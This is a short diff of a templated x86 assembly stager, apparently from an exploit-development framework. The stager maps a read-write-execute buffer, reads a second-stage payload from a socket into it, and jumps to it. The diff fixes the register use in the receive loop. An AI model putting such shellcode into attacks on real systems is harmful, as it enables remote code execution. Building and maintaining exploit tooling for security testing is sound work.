@@ -23,7 +23,7 @@ ${stager}:
     ${mov('ebx', 0)}
     ${syscall(SYS_mmap2, 'ebx', mmap_size, rwx, anon_priv, -1, 'ebx')}
 
-    pop  ebp /* socket */
+    pop  ebx /* socket */
     push eax /* save for: pop eax; call eax later */
 
 /* read/recv loop */
@@ -36,11 +36,12 @@ ${looplabel}:
     js ${errlabel}
 % endif
 % if not tiny:
-    add ebx, eax
-    sub edx, eax
+    add ecx, eax /* increment destination pointer */
+    sub edx, eax /* decrement remaining amount */
     jnz ${looplabel}
 % endif
 
+	mov ebp, ebx
     ret /* start of mmapped buffer, ebp = socket */
 
 % if handle_error:
